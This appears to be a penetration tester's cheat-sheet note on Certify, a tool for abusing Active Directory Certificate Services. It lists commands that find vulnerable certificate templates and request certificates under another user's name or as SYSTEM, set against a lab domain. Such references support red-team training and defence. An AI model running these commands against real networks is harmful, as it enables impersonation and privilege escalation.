# Certify

> C# tool for [[adcs|ADCS]] abuse.]

---

## Enumerate the Current Environment's Certificate Authorities (CAs)

```batch
Certify.exe cas
```

Also lists the names of each CAs' certificate templates.

---

## Enumerate the Current Environment's Certificate Templates

```batch
Certify.exe find
```

---

## Enumerate the Current Environment's "Vulnerable" Certificate Templates

```batch
Certify.exe find /vulnerable [/currentuser]
```

- Without `/currentuser`, `Certify.exe` will return certificate templates usable by default low-privilege groups
- With `/currentuser`, `Certify.exe` will return certificate templates usable by groups the current user is a part of

---

## Request a PEM User Certificate

```batch
Certify.exe request /ca:$CA_SPN /template:$TEMPLATE_NAME
```

- `$CA_SPN` example: `dc01.marvel.lab\ca-1`

---

## Request PEM User Certificate with Alternate Subject Name

```batch
Certify.exe request /ca:$CA_SPN /template:$TEMPLATE_NAME /altname:$USERNAME
```

- `$CA_SPN` example: `dc01.marvel.lab\ca-1`
- `$USERNAME`
	- Can be with or without the domain name

---

## Request a PEM Machine Certificate

```batch
Certify.exe request /ca:$CA_SPN /template:$TEMPLATE_NAME /machine
```

- `$CA_SPN` example: `dc01.marvel.lab\ca-1`
- According to RastaMouse, the `/machine` parameter tells Certify to auto-elevate to SYSTEM and assume the identity of the machine account (for which you need to be running in high-integrity)

---

## References

[Certify GitHub Repository](https://github.com/GhostPack/Certify)
